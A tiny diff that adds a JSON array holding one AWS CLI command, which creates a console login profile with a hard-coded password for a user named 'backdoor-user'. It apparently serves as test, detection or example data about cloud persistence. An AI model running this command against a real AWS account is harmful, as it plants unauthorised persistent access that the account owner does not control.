@@ -1,0 +1,3 @@
+[
+  "aws iam create-login-profile --user-name backdoor-user --password 'P@ssw0rd123!' --password-reset-required"
+]
